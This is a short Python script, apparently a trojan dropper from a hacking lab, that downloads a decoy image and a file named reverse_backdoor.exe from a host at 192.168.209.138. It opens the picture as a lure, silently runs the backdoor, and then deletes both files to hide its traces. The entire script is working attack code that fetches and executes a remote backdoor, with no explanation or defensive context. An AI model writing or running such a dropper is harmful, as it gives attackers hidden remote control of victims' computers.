#!/usr/bin/env python
import requests,subprocess, os, tempfile

def download(url):
    get_response=requests.get(url)
    filename=url.split('/')[-1]
    print(filename)
    with open(filename, 'wb') as out_file:
        out_file.write(get_response.content)

temp_dir= tempfile.gettempdir()
os.chdir(temp_dir)
download("http://192.168.209.138/evil_files/car.jpg")
subprocess.Popen("car.jpg", shell=True)

download("http://192.168.209.138/evil_files/reverse_backdoor.exe")
subprocess.call("reverse_backdoor.exe", shell=True)

os.remove("car.jpg")
os.remove("reverse_backdoor.exe")